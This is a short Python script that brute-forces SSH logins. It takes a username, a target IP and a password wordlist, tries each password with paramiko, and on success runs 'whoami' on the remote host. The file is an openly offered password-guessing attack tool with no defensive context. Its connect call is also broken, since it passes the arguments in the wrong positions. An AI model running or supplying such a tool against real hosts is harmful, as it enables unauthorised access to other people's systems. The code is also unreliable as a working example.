#!/usr/bin/python3

import paramiko
import sys
import threading
import socket


GREEN = '\033[92m'
Blue = '\033[94m'
Cyan = '\033[96m'
Magenta = '\033[95m'
Grey = '\033[90m'
Black = '\033[90m'
Default = '\033[99m'

RED = '\033[91m'
PURPLE = '\033[95m'
YEL = '\033[93m'
WHITE = '\033[37m'
ENDC = '\033[0m'

ssh=paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())


user=input("Enter Username: ")

host=input("Enter ip: ")

with open(sys.argv[1], 'r' ) as f:
    for line in f.readlines():
        password= line.strip('\n')

        try:
            ssh.connect(host, user, password)

        except paramiko.ssh_exception.AuthenticationException:

            print (f"Incorrect Username {user} and Password {password}")

        else:

            print(f"Correct username {user} and Password {password}")

            stdin, stdout, stderr=ssh.exec_command("whoami")

            for line in stdout.readlines():
                print(line.strip())
            break

ssh.close()
